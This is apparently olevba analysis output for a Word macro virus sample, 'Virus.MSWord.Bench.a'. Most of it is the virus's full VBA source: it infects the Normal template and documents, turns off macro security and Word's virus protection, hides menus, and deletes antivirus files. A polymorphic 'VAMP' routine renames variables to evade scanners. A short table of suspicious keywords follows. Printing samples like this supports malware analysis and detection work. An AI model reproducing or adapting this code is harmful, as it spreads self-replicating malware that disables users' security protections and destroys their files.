olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.a-d87fb684ee8a8fe4caa82d94731eed201d151a35
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.a-d87fb684ee8a8fe4caa82d94731eed201d151a35 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal
If Month(Now) = Minute(Now) Then
Randomize: For x = 1 To 10: ActiveDocument.Shapes.AddShape(msoShapeCircles, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select: Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255)): Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next x
End If
If Day(Now) = Minute(Now) Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "[B]MV.a"
        .Text = "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!" & vbCr & vbCr & "Click on me if you need any help!"
        .Animation = msoAnimationGreeting
        .Show
    End With
End If
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Application.Version = 9# Then ' two lines below from W2000M/PSD - I'll give VicodinES the credit for this!
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End If
If Application.Version = 8# Then
    CommandBars("tools").Controls("Macro").Visible = False: CommandBars("tools").Controls("Customize...").Enabled = False: CommandBars("view").Controls("Toolbars").Enabled = False: CommandBars("view").Controls("Status Bar").Enabled = False
    Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Application.EnableCancelKey = wdCancelDisabled
End If
If nt = 0 And ad = 0 Then GoTo darn:
If nt = 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ad))
If ad = 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, nt))
' *** Remove remarks below if you want to kill the AV proggies ***
Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
' Kill "C:\program files\antiviral toolkit pro\AVP.key"
' ActiveDocument.Save
darn:
If nt <> 0 And ad = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub ' [B]MV.a Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97]
Private Sub INITALIZE_VAMP()
On Error Resume Next
Randomize
Dim r1(1 To 8) As String ' Update the array for however many variable you add - so if you have r1(20) then this line should read r1(1 to 20)
r1(1) = "VARIABLE3": r1(2) = "VARIABLE4": r1(3) = "VARIABLE5": r1(4) = "VARIABLE6": r1(5) = "VAMP": r1(6) = "INITALIZE": r1(7) = "VARIABLE2": r1(8) = "VARIABLE1"
r1(9) = "ad": r1(10) = "nt"
For x = 1 To 8 ' Change this number up to how ever many variable you add - so if you have r1(20) then this line should read x = 1 to 20
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call VAMP(a1, r1(x))
Next x
End Sub
Private Sub VAMP(VARIABLE1, VARIABLE2 As String)  'VAMP v1.0 -=[Thanks Vic!]=-
On Error Resume Next
Dim VARIABLE3 As Long: Dim VARIABLE4 As Long: Dim VARIABLE5 As Long: Dim VARIABLE6 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VARIABLE3 = 1: VARIABLE4 = 1: VARIABLE5 = .CountOfLines: VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Do While .Find(VARIABLE2, VARIABLE3, VARIABLE4, VARIABLE5, VARIABLE6, True)
s1 = .Lines(VARIABLE3, 1)
s1 = Left(s1, VARIABLE4 - 1) & VARIABLE1 & Mid(s1, VARIABLE6)
.replaceline VARIABLE3, s1
VARIABLE3 = VARIABLE5 + 1: VARIABLE4 = 1
VARIABLE5 = .CountOfLines
VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

